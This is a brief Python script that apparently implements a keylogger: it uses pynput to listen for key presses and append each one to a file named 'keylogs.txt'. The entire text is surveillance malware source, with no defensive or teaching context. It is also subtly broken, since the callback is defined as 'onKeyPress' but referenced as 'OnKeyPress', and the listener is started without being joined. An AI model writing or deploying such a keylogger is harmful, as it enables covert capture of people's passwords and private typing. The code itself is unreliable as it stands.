from pynput.keyboard import Listener

def onKeyPress(key):
    with open("keylogs.txt", "a") as file:
        file.write(str(key))

if __name__ == "__main__":
    listener = Listener(on_press=OnKeyPress)
    listener.start()